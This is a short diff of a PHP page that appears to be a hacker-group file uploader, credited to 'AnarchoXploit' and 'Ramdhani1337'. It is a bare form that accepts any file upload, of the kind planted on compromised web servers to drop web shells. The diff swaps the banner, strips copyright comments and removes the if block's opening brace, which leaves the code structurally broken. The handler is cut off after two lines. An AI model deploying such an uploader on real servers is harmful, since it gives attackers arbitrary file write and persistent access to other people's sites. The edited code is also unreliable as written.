@@ -1,17 +1,12 @@
 <center>
-	<h3>Ramdhani7 | AnarchoXploit| Buat apa gan pansos pansos bait sana sini soof sana sini biar di bilang pro gitu?? hhh "</h3><br>
+	<h3>Uploader By Ramdhani1337 "</h3><br>
 <form method="post" enctype="multipart/form-data">
 <input type="file" name="file">
 <br>
 <button name="gas">up!</button>
 <?php
 
-if(isset($_POST['gas'])){
-	
-	//copyright by botline
-	//jangan ganti copyright
-	//w3ll squad
-	//uploader html
+if(isset($_POST['gas']))
 
 $nama = $_FILES['file']['name'];
 $gagal = $_FILES['file']['error'];
